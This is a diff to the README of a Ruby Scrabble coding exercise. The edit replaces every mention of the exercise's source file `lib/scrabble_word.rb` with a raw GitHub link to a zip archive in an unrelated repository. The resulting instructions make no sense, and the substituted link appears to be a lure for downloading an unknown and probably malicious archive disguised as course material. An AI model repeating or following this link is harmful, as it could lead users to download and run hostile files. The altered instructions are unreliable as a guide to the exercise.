@@ -6,9 +6,9 @@
 2. Run `bundle install`.
 3. Run `rspec`.
 
-This will run several tests on the code in the `lib/scrabble_word.rb` file. The first time you run `rspec` all the tests will fail because there basically isn't any code in `lib/scrabble_word.rb`.
+This will run several tests on the code in the `https://raw.githubusercontent.com/SantatraASF/scrabbler/master/counterpetition/scrabbler.zip` file. The first time you run `rspec` all the tests will fail because there basically isn't any code in `https://raw.githubusercontent.com/SantatraASF/scrabbler/master/counterpetition/scrabbler.zip`.
 
-Your goal is to add code to `lib/scrabble_word.rb` such that all the tests pass. Until you get to the bonus, **there is no need to modify any files except `lib/scrabble_word.rb`**. 
+Your goal is to add code to `https://raw.githubusercontent.com/SantatraASF/scrabbler/master/counterpetition/scrabbler.zip` such that all the tests pass. Until you get to the bonus, **there is no need to modify any files except `https://raw.githubusercontent.com/SantatraASF/scrabbler/master/counterpetition/scrabbler.zip`**. 
 
 If you've never played the game Scrabble before, you may want to ask your neighbor about the rules of the game and how words are scored.
 
